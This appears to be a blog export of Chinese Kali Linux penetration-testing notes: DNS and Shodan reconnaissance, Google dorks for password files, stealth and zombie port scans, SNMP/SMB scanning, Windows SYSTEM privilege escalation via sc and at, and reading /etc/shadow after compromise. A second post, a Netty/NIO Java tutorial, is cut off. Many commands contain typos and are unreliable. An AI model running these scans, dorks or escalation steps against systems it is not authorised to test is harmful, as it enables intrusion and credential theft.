class="keyword">Endpoints:查看每种协议具体的ip、包大小、发送数量。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">协议分级：查看当前帧下的所有协议流量所占百分比。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">分组长度：查看不同大小包所占百分比。小包过多会导致瘫痪，可能是攻击行为。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Conversitions：查看所有会话之间的通信情况。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">专家系统：针对连接提供一些建议或提示</span></span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><blockquote><p>wireshark 不适用于抓取大量报，因此企业使用一般会使用类似于</p><p>Sniffer、Cace、Cascad poit等。</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="DNS信息收集——NSLOOKUP"><a href="#DNS信息收集——NSLOOKUP" class="headerlink" title="DNS信息收集——NSLOOKUP"></a>DNS信息收集——NSLOOKUP</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">使用nslookup查看域名解析过程和对应ip</span><br><span class="line"></span><br><span class="line">tosang@kali:~/桌面$ nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> www.baidu.com</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.com   canonical name = www.a.shifen.com.</span><br><span class="line">Name:   www.a.shifen.com</span><br><span class="line">Address: 61.135.169.125</span><br><span class="line">Name:   www.a.shifen.com</span><br><span class="line">Address: 61.135.169.121</span><br></pre></td></tr></table></figure><h4 id="DNS信息收集——DIG（更强大）"><a href="#DNS信息收集——DIG（更强大）" class="headerlink" title="DNS信息收集——DIG（更强大）"></a>DNS信息收集——DIG（更强大）</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609102507339.png" alt="image-20200609102507339"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">根据自定义域名服务器查询：dig @8.8.8.8 www.sina.com mx</span><br><span class="line"></span><br><span class="line">正向查询：dig www.sina.com any </span><br><span class="line"></span><br><span class="line">反向查询（使用ptr反向解析）: dig +noall +answer -x 8.8.8.8</span><br><span class="line">		其中+noall +answer表示省略无用信息</span><br><span class="line"></span><br><span class="line">bind版本信息: dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com </span><br><span class="line">			通过查询bind版本信息可以分析是否存在漏掉可以利用</span><br><span class="line"></span><br><span class="line">DNS追踪: dig +trace example.com</span><br><span class="line"></span><br><span class="line">抓包比较递归查询、迭代查询过程的区别</span><br></pre></td></tr></table></figure><hr><blockquote><p>DNS追踪示例：图中是13个根域名服务器（root域）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105201886.png" alt="image-20200609105201886"></p><blockquote><p>接着查询.com域名服务器地址（com域）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105435329.png" alt="image-20200609105435329"></p><blockquote><p>然后从这些.com域名中随机挑选一个ip去查询baidu.com域的ns记录</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111657846.png" alt="image-20200609111657846"></p><blockquote><p>最后从ns记录中随机挑选一个去查询<span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb23orrDlvZXlvpfliLBjbmFtZee7k+aenO+8jOino+aekGNuYW1l5Y+v5Lul5LuO55m+5bqm55qE5Z+f5ZCN5pyN5Yqh5Zmo77yIbnPvvInlvpfliLDmnIDnu4hpcOWcsOWdgA==">www.baidu.com记录得到cname结果，解析cname可以从百度的域名服务器（ns）得到最终ip地址<i class="fa fa-external-link-alt"></i></span></p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111723401.png" alt="image-20200609111723401"></p><h4 id="DNS区域传输（Zone-Transfer）"><a href="#DNS区域传输（Zone-Transfer）" class="headerlink" title="DNS区域传输（Zone Transfer）"></a>DNS区域传输（Zone Transfer）</h4><blockquote><p>区域传输是指域名服务器之间同步数据的过程，通过区域传输可以获得某一个域里面的所有主机记录</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">以下命令可以尝试去连接域名服务器，但一般会被拒绝</span><br><span class="line">dig @ns1.example.com example.com axfr</span><br><span class="line">host -T -l sina.com8.8.8.8</span><br></pre></td></tr></table></figure><h4 id="DNS爆破"><a href="#DNS爆破" class="headerlink" title="DNS爆破"></a>DNS爆破</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt </span><br><span class="line">	fierce自带字典host.txt，可以通过命令 查看</span><br><span class="line"></span><br><span class="line">dnsdict6 -d4 -t 16 -x sina.com </span><br><span class="line">	默认集成多种字典，命中率高，执行速度快，最常用</span><br><span class="line"></span><br><span class="line">dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -0 sina.xml</span><br><span class="line"></span><br><span class="line">dnsmap sina.com -W dns.txt</span><br><span class="line"></span><br><span class="line">dnsrecon -d sina.com -lifetime 10 -t brt -D dnsbig.txt</span><br><span class="line"></span><br><span class="line">dnsrecon -t std -d sina.com</span><br></pre></td></tr></table></figure><h4 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">说明：一般大型互联网企业域名都做了反查询，所以会查不到</span><br><span class="line"></span><br><span class="line">Whois </span><br><span class="line"></span><br><span class="line">whois -h whois.apnic.net 192.0.43.10</span><br></pre></td></tr></table></figure><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHODAN：使用前需要到shodan官网注册一个账号，并获取自己的API Key</span><br><span class="line"></span><br><span class="line">搜索联网的设备</span><br><span class="line">Banner: http、 ftp、 ssh、 telnet</span><br><span class="line">https://www.shodanio/</span><br><span class="line">常见filter:</span><br><span class="line">	net (192. 168.20.1)</span><br><span class="line">	city</span><br><span class="line">	country (CN、US)</span><br><span class="line">	port (80、 21、22、23)</span><br><span class="line">	OS</span><br><span class="line">	Hostname (主机或域名)</span><br><span class="line">	server</span><br><span class="line">	</span><br><span class="line">示例：搜索中国地区端的81端口ip</span><br><span class="line">port:81 country:CN HTTP/1.1 200</span><br></pre></td></tr></table></figure><blockquote><p>使用示例：首先通过nc获取某个域名的ip，这里以gscaep.ac.cn为例</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161551929.png" alt="image-20200609161551929"></p><blockquote><p>使用shodan来搜索该ip的所有信息</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161728440.png" alt="image-20200609161728440"></p><blockquote><p>这一刀这里暴露了使用的数据库版本及其端口信息，可以尝试用nc去连接</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609162101517.png" alt="image-20200609162101517"></p><h4 id="GOOGLE搜索方法"><a href="#GOOGLE搜索方法" class="headerlink" title="GOOGLE搜索方法"></a>GOOGLE搜索方法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+充值 -支付  +代表含有，-代表排除</span><br><span class="line"></span><br><span class="line">北京的电子商务公司—— 北京 intitle:电子商务 intext:法人 intext:电话</span><br><span class="line"></span><br><span class="line">阿里网站上的北京公司联系人——北京 site:alibaba.com inurl:contact</span><br><span class="line"></span><br><span class="line">塞班司法案的PDF文档——SOX filetype:pdf</span><br><span class="line"></span><br><span class="line">法国的支付相关页面——payment site:fr</span><br><span class="line"></span><br><span class="line">一些常用实例：</span><br><span class="line">inurt:"level/15/exec/-/show"</span><br><span class="line">intille: "netbotz appliance" "ok"</span><br><span class="line">inurl /admin/login.php</span><br><span class="line">inurt:qq.txt</span><br><span class="line">filetype:xls "username| password"</span><br><span class="line">inud:ftp "password" filetype:xls site:baidu.com</span><br><span class="line">Inurd:Service.pwd</span><br><span class="line">http://exploit.db.com/google-dorks</span><br></pre></td></tr></table></figure><h4 id="搜索工具"><a href="#搜索工具" class="headerlink" title="搜索工具"></a>搜索工具</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theHarvester 可以使用google、bing等搜索引擎搜索文域名、邮件，需要翻墙</span><br><span class="line"></span><br><span class="line">Maltego 图形化展示搜索工具，kali十大工具之一</span><br></pre></td></tr></table></figure><h4 id="文件信息——METADATA（元数据）"><a href="#文件信息——METADATA（元数据）" class="headerlink" title="文件信息——METADATA（元数据）"></a>文件信息——METADATA（元数据）</h4><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">exiftool</span> <span class="string">xx.jpg  查看图片Exif图片信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Foca</span> <span class="string">windows平台软件</span></span><br></pre></td></tr></table></figure><h4 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><blockquote><p>RECON-NG是一个全特性的，基于Python的web侦探框架。输入help查看所有命令含义</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609191006019.png" alt="image-20200609191006019"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">常用命令：</span><br><span class="line"></span><br><span class="line">recon-ng sina   建立名为sina的工作区</span><br><span class="line">keys add baidu_api api 为baidu_api添加api</span><br><span class="line">keys remove xxx 移除某个api</span><br><span class="line">keys list 查看所有api</span><br><span class="line"></span><br><span class="line">安装模块：</span><br><span class="line">marketplace refresh # 更新模块列表</span><br><span class="line">marketplace search hackertarget # 搜索 hackertarget 模块，可以发现支持模糊搜索</span><br><span class="line">marketplace install recon/domains-hosts/hackertarget # 复制模块名，安装</span><br><span class="line"></span><br><span class="line">使用模块：</span><br><span class="line">modules load recon/domains-hosts/hackertarget # 加载模块</span><br><span class="line">info # 查看模块的描述信息及参数。这里发现该模块是用来搜索主机名。</span><br><span class="line"></span><br><span class="line">help # 查看该模块下的使用命令，其中 options 用来修改模块的参数。（goptions 是全局参数，在非模块模式下才可修改。）</span><br><span class="line">options set SOURCE rapid7.com # 设置 SOURCE 参数（用来探测 rapid7.com的主机）</span><br><span class="line">run # 设置好参数后，直接运行。</span><br><span class="line">show hosts # 在上述 hackertarget 的描述中发现，会把搜索记录 放到 hosts 表中，可以使用 show 命令查看。</span><br></pre></td></tr></table></figure><h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="二层发现——arping"><a href="#二层发现——arping" class="headerlink" title="二层发现——arping"></a>二层发现——arping</h4><blockquote><p>二层发现使用arp协议，在局域网下进行</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arping 用于在局域网通过目标ip获取mac地址</span><br><span class="line"></span><br><span class="line">arping 1.1.1.1 -c 1</span><br><span class="line">arping 1.1.1.1 -d 发现同一ip下重复的mac</span><br><span class="line">arping c1 1.1.1.1 | grep "bytes from" | cut d"-f5 | cut d"T"-f2 I cut -d"]"-f 1</span><br><span class="line">脚本</span><br><span class="line">	arping l.sh etho &gt; addrs</span><br><span class="line">	arping 2.sh addrs</span><br><span class="line"></span><br><span class="line">场景：通过编写脚本，arping可以发现子网段的所有连接的ip及其mac地址</span><br></pre></td></tr></table></figure><h4 id="二层发现——nmap（常用）"><a href="#二层发现——nmap（常用）" class="headerlink" title="二层发现——nmap（常用）"></a>二层发现——nmap（常用）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 1.1.1.1-254 -sn 扫描ping，但是不去扫描端口</span><br><span class="line">		namp在扫描的时候会尝试对找到的ip进行反向查询dns获取其域名</span><br><span class="line">nmap -iL iplist.txt sn</span><br></pre></td></tr></table></figure><h4 id="二层发现——Netdiscover"><a href="#二层发现——Netdiscover" class="headerlink" title="二层发现——Netdiscover"></a>二层发现——Netdiscover</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Netdiscover专用于二层发现，可用于无线和交换网络环境，主动和被动探测</span><br><span class="line"></span><br><span class="line">主动探测：</span><br><span class="line">netdiscover -i ethO T 1.1.1 .0/24</span><br><span class="line">netdiscover -1 iplist.txt</span><br><span class="line"></span><br><span class="line">被动：</span><br><span class="line">（主动arp容易触发报警，伪装成局域网一部分，截取arp数据包分析）</span><br><span class="line">netdiscover -P</span><br></pre></td></tr></table></figure><h4 id="二层发现——Scapy"><a href="#二层发现——Scapy" class="headerlink" title="二层发现——Scapy"></a>二层发现——Scapy</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Scapy</span><br><span class="line">	作为Python库进行调用</span><br><span class="line">	也可作为单独的工具使用</span><br><span class="line">	抓包、分析、创建、修改、注入网络流量</span><br><span class="line"></span><br><span class="line">apt-get install python-gnuplot</span><br><span class="line"></span><br><span class="line">Scapy</span><br><span class="line">	ARP().display()</span><br><span class="line">	Sr1()</span><br><span class="line">	</span><br><span class="line">Python脚本</span><br><span class="line">	Arpl.py</span><br><span class="line">	Arp2.py</span><br></pre></td></tr></table></figure><h4 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h4><blockquote><p>优点：可路由、速度比较快<br>缺点：速度比二层慢、经常被边界防火墙过滤<br>协议：IP、ICMP协议。在广域网进行</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">说明：ttl值在linux系统性一般是64，每经过一跳路由自动减一</span><br><span class="line"></span><br><span class="line">Ping 1.1.1.1 -c 2 </span><br><span class="line">		-c指定发送几个请求</span><br><span class="line">Ping-R 1.1.1.1 / traceroute 1.1.1.1</span><br><span class="line">ping 1.1.1.1-C 1 | grep "bytes from" | cut -d "" -f4 | cut-d":"-f 1</span><br><span class="line"></span><br><span class="line">pmap -sn 1.1.1.1 -255</span><br><span class="line">nmap -iL iplist.txt -sn</span><br><span class="line"></span><br><span class="line">Hping</span><br><span class="line">	能够发送几乎任意TCP/IP包</span><br><span class="line">	功能强大但每次只能扫描一个目标</span><br><span class="line">	</span><br><span class="line">hping3 1.1.1.1 -icmp -C 2</span><br><span class="line">for addr in $(seq 1 254); do hping3 1.1.1.$addr icmp C I &gt;&gt; handle.txt &amp; done</span><br></pre></td></tr></table></figure><h4 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h4><blockquote><p>优点：可路由且结果可靠、不太可能被防火墙过滤、甚至可以发现所有端口都被过滤的主机<br>缺点：基于状态过滤的防火墙可能过滤扫描、全端口扫描速度慢<br>TCP：未经请求的ACK- RST、SYN-SYN/ACK、 RST<br>UDP：ICMP端口不可达、一去不复返</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 1.1.1.1-254 -PU53 -sn 使用udp发现</span><br><span class="line">nmap 1.1.1.1-254 -PA80 -sn 使用TCP发现（ack包 ）</span><br><span class="line">nmap -iL iplist.txt -PA80 -sn</span><br><span class="line"></span><br><span class="line">端口扫描：</span><br><span class="line">Nmap</span><br><span class="line">nmap -sU 1.1.1.1 默认的1000个参数</span><br><span class="line">		ICMP host-unreachable说明端口关闭</span><br><span class="line">		没有回应说明可能开启</span><br><span class="line">nmap 1.1.1.1 -sU-p 53</span><br><span class="line">nmap -iL iplist.txt -sU P 1-200</span><br></pre></td></tr></table></figure><blockquote><p>所有的TCP扫描都是基于三次握手的变化来判断目标端口的状态</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">隐蔽扫描：</span><br><span class="line">	即每次不建立完整三次连接，只发生syn信息</span><br><span class="line">	应用日志不记录扫描行为，较为隐蔽</span><br><span class="line">	发送流程为：--&gt;使用scapy发送Syn包给目标主机</span><br><span class="line">    		  &lt;--目标主机回复syn/ack包</span><br><span class="line">    		  --&gt;本机操作系统内核会识别到异常握手，发出RST请求</span><br><span class="line">    屏蔽内核的RST请求：</span><br><span class="line">    iptables -A OUTPUT -P tcp --tcp-flags RST RST -d 本地ip -j DROP</span><br><span class="line"></span><br><span class="line">	Scapy命令：</span><br><span class="line">sr1(IP(dst="192.168.60.3]/TCP(dport=80),timneout=l,verbose=1)</span><br><span class="line">	</span><br><span class="line">	nmap命令：</span><br><span class="line">	nmap -sS 1.1.1.1 -p 80 21,25.110.443</span><br><span class="line">	nmap -sS 1.1.1.1 -P -65535 --open</span><br><span class="line">	nmap -sS 1.1.1.1 -P  --open</span><br><span class="line">	nmap -sS -iL iplist.txt -P 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">僵尸扫描</span><br><span class="line">	极度隐蔽</span><br><span class="line">	实施条件苛刻</span><br><span class="line">	可伪造源地址</span><br><span class="line">	选择僵尸机：闲置系统且系统使用递增的IPID，不能全是0</span><br><span class="line">发现僵尸机： </span><br><span class="line">nmap -P 80 192.168.1.133 --script=ipidseq.nse</span><br><span class="line">扫描目标：</span><br><span class="line">nmap 172.16.36.135 -sl 172.16.36.134 Pn p 0- 100</span><br></pre></td></tr></table></figure><h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><blockquote><p>SNMP:<br>简单网络管理协议<br>Community strings<br>信息查询或重新配置<br>识别和绕过防火墙筛选</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">扫描banner：</span><br><span class="line">nc -nv x.x.x.x</span><br><span class="line"></span><br><span class="line">dmitry -p 172. 16.36.135</span><br><span class="line">dmitry -pb 172.16.36.135</span><br><span class="line"></span><br><span class="line">nmap -sI 1.1.1.1 -P 22 -script=banner </span><br><span class="line">nmap 域名/IP            （最强大）</span><br></pre></td></tr></table></figure><h4 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h4><blockquote><p>用处不大，现在的服务器会限制特定ip访问snmp</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snmp:</span><br><span class="line">	信息的金矿</span><br><span class="line">	经常被错误配置</span><br><span class="line">	public / private / manager</span><br><span class="line">MIB Tree:</span><br><span class="line">	SNMP Management Information Base (MIB)</span><br><span class="line">	树形的网络设备管理功能数据库</span><br><span class="line">	1.3.6.1.4.1.77.1.2.25</span><br><span class="line">onesixtyone 1.1.1.1 public</span><br><span class="line">onesixtyone -C dict.txt -i hosts -o my.log -W 100</span><br><span class="line">可读性强的工具：</span><br><span class="line">snmpcheck -t 192. 168.20.199</span><br><span class="line">snmpcheck -t 192. 168.20.199 -C private -V 2</span><br><span class="line">snmpcheck -t 192. 168.20.199 -W</span><br></pre></td></tr></table></figure><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h4><blockquote><p><code>Server Message Block</code> 协议是微软历史上出现安全问题最多的协议，实现复杂，默认开放，文件共享</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -v -p 139,445 192.168.60.1-20</span><br><span class="line">nmap 192.168.60.4 -p 139,445 --script=smb-os- discovery.nse</span><br><span class="line">nmap -v -P 139,445 --script=smb-check-vulns --script-args=unsafe=1 1.1.1.1</span><br><span class="line">nbtscan -r 192. 168.60.0/24</span><br><span class="line">enum4linux -a 192.1 68.60.10</span><br></pre></td></tr></table></figure><h4 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h4><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">WEB应用防火墙</span></span><br><span class="line"><span class="attr">wafw00f</span> <span class="string">-l</span></span><br><span class="line"><span class="attr">wafw00f</span> <span class="string">http://www.microsoft.com</span></span><br><span class="line"><span class="attr">nmap</span> <span class="string">www.microsoft.com --script=http-waf-detect.nse</span></span><br></pre></td></tr></table></figure><h3 id="弱点-漏洞-扫描"><a href="#弱点-漏洞-扫描" class="headerlink" title="弱点(漏洞)扫描"></a>弱点(漏洞)扫描</h3><blockquote><p>kali集成了漏洞利用工具，使用searchsploit，我们可以搜索软件当前存在的漏洞及其攻击代码。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200611094925425.png" alt="image-20200611094925425"></p><blockquote><p>此外，NEXPOSE也是一款面向企业的强大的漏洞扫描工具，可以对web页面、操作系统进行登录扫描或黑盒扫描。NEXPOSE会将扫描到的漏洞按CVSS评级进行打分，并且可以生产报告。</p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><blockquote><p>Admin提权为System</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Windows system账号</span><br><span class="line">官方工具：</span><br><span class="line">	SysInternal suite</span><br><span class="line">	https://technet.microsoft.com/en-us/sysinternals/bb545027</span><br><span class="line">	psexec -i -S d taskmgr</span><br><span class="line"></span><br><span class="line">xp系统下：</span><br><span class="line">	at 19:39 /interactive cmd 该命令会定时启动一个system权限的cmd</span><br><span class="line">								（只能在xp系统使用）</span><br><span class="line">通过服务方式：</span><br><span class="line">	SC Create syscmd binPath= "cmd /K start" type= own type= interact</span><br><span class="line">	SC start syscmd</span><br><span class="line">	</span><br><span class="line">隐蔽注入：</span><br><span class="line">	上面的几种方式会创建单独的进程，可能被发现，可以使用pinjector进行隐蔽注入，注入到某个system权限的进程中，然后通过nc可以远程shell</span><br></pre></td></tr></table></figure><h4 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">	Wireshark</span><br><span class="line">	Omnipeek</span><br><span class="line">	commview</span><br><span class="line">	Sniffpass</span><br><span class="line">Linux：</span><br><span class="line">	Tcpdump</span><br><span class="line">	Wireshark</span><br><span class="line">	Dsniff</span><br></pre></td></tr></table></figure><h4 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><blockquote><p>当我们获取到某个主机的root权限后，我们要尽可能收集其信息</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Linux:</span><br><span class="line">    /etc/resolv.conf   dns配置信息</span><br><span class="line">    /etc/passwd   存放用户账户</span><br><span class="line">    /etc/shadow	   存放用户密码</span><br><span class="line">    whoami, who -a</span><br><span class="line">    ifconfig -a, iptables -L -n, netstat -rn</span><br><span class="line">    uname -a, ps aux 查看操作系统信息，进程信息</span><br><span class="line">    dpkg -l | head  查看安装的软件</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Netty编程之NIO实践</title>
    <url>/2020/03/17/Netty%E7%BC%96%E7%A8%8B%E4%B9%8BNIO%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><blockquote><p>最近在学习Netty，其核心便是基于Java的NIO编程封装而来，这篇文章对NIO编程的原理进行介绍，并提供一个NIO编程的完整实践案例。</p></blockquote><a id="more"></a><h3 id="什么是Netty"><a href="#什么是Netty" class="headerlink" title="什么是Netty?"></a>什么是Netty?</h3><blockquote><p>Netty的特点总结如下：</p></blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9OZXR0eS8xMDA2MTYyND9mcj1hbGFkZGlu">Netty<i class="fa fa-external-link-alt"></i></span>是由JBOSS提供的一个Java开源框架，现在为Github上的独立开发项目。</li><li>Netty是一个异步的、基于事件驱动的网络应用框架，用以快速开发高性能、高可靠性的网络IO程序。</li><li>Netty主要针对在TCP协议下，面向Clients端的高并发应用，或者<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGluc2Fuc2h1L3AvNTU0Njk0OC5odG1s">Peer-to-Peer<i class="fa fa-external-link-alt"></i></span>场景下的大量数据持续传输的应用。</li><li>Netty的本质是一个NIO框架，用于服务器通信。</li></ul><hr><h3 id="Java网络编程三兄弟：BIO、NIO、NIO2-AIO"><a href="#Java网络编程三兄弟：BIO、NIO、NIO2-AIO" class="headerlink" title="Java网络编程三兄弟：BIO、NIO、NIO2(AIO)"></a>Java网络编程三兄弟：BIO、NIO、NIO2(AIO)</h3><hr><blockquote><p>显然NIO是Netty的灵魂，由于NIO属于Java三大I/O模型之一，要学习它不如把这三者合在一起先做个了解。</p></blockquote><table><thead><tr><th>I/O模型</th><th align="center">类型</th><th>描述</th></tr></thead><tbody><tr><td>Java BIO</td><td align="center">同步阻塞（传统阻塞型）</td><td>服务器实现模式为<strong>一个连接绑定一个线程</strong>即客户端有一个连接，当有客户端请求时，就需要启动一个线程进行处理。如果这个连接不做任何事情则造不必要的线程开销。</td></tr><tr><td>Java NIO</td><td align="center">同步非阻塞</td><td>服务器实现模式为<strong>一个线程处理多个请求</strong>，即客户端发送的请求会注册到多路复用器上，多路复用器可以轮询存在的I/O请求进行处理。</td></tr><tr><td>Java AIO</td><td align="center">异步非阻塞</td><td>AIO引入异步通道的概念，采用Proactor模式，简化了程序的编写，有效的请求才启动线程，它的特点是先由操作系统完成后才通知服务端程序启动线程去处理，一般适用于连接数较多且连接时间较长的应用。</td></tr></tbody></table><hr><h3 id="NIO核心原理"><a href="#NIO核心原理" class="headerlink" title="NIO核心原理"></a>NIO核心原理</h3><p><code>NIO</code>由三大核心部分组成：</p><ul><li><code>Channel</code>：通道。</li><li><code>Buffer</code>：缓冲区。</li><li><code>Selector</code>：选择器。</li></ul><p>原理说明：</p><hr><blockquote><ul><li>每个<code>Channel</code>对应一个<code>Buffer</code>。</li><li><code>Selector</code>对应一个线程，一个线程对应多个<code>Channel</code>。</li><li>多个<code>Channel</code>可以注册到一个<code>Selector。</code></li><li>程序切换Channel由事件决定。</li><li><code>Selector</code>会根据不同事件，在各个<code>Channel</code>切换。</li><li>数据的读取或者写入通过<code>Buffer</code>，是双向的，但需要<code>flip()</code>切换读/写模式。</li><li><code>Channel</code>是双向的，可以返回底层操作系统的情况（比如<code>Linux</code>底层是双向的）。</li></ul></blockquote><hr><p><strong>NIO模式示意图如下：</strong><br><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/NIO.png" alt="NIO示例图" style="zoom:80%"></p><hr><h4 id="关于Channel"><a href="#关于Channel" class="headerlink" title="关于Channel"></a>关于Channel</h4><blockquote><p>基本介绍:</p></blockquote><ol><li><code>BIO</code>中的<code>stream</code>是单向的，例如<code>FileInputStream</code> 对象只能进行读取数据的操作，而NIO中的通道(<code>Channel</code>)是双向的，可以读操作，也可以写操作。</li><li><code>Channel</code>在<code>NIO</code>中是一 个接口：<font color="green"><strong>public interface Channel extends Closeable{}</strong></font>。</li><li>常用的<code>Channel</code>类有: <code>FileChannel</code>、<code>DatagramChannel</code>、<code>ServerSocketChannel</code> 和<code>SocketChannel</code>。<font color="green"><strong><code>ServerSocketChannel</code>类似<code>ServerSocket</code>，<code>SocketChannel</code>类似<code>Socket</code></strong></font></li><li><code>FileChannel</code> 用于文件的数据读写，<code>DatagramChannel</code>用于<code>UDP</code>的数据读写，<code>ServerSocketChannel</code>和<code>SocketChannel</code>用于<code>TCP</code>的数据读写。</li></ol><hr><h4 id="关于Buffer"><a href="#关于Buffer" class="headerlink" title="关于Buffer"></a>关于Buffer</h4><blockquote><p>Java的基本数据类型（除了boolean）均有一个Buffer类与之对应，最常用的自然是<code>ByteBuffer</code>类，该类的主要方法如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ByteBuffer</span></span>&#123;</span><br><span class="line">        <span class="comment">//缓冲区创建相关api</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">llocateDirect</span><span class="params">(<span class="keyword">int</span> capacty)</span><span class="comment">//创建直接缓冲区</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">llocate</span><span class="params">(<span class="keyword">int</span> capacty)</span><span class="comment">//设置缓冲区的初始容量</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">wrap</span><span class="params">(<span class="keyword">byte</span>[] array)</span><span class="comment">//把个数组放到缓冲区中使用</span></span></span><br><span class="line"><span class="function">        <span class="comment">//构造初始化位置ofset和上界length的缓冲区</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">wrap</span><span class="params">(<span class="keyword">byte</span>[] array,<span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function">        <span class="comment">//缓存区存取相关API</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">byte</span> <span class="title">get</span><span class="params">( )</span><span class="comment">//从当前位置position上get, get之后， position会自动+1</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">byte</span> <span class="title">get</span> <span class="params">(<span class="keyword">int</span> index)</span></span>;<span class="comment">//从绝对位置get</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> ByteBuffer <span class="title">put</span> <span class="params">(<span class="keyword">byte</span> b)</span>:<span 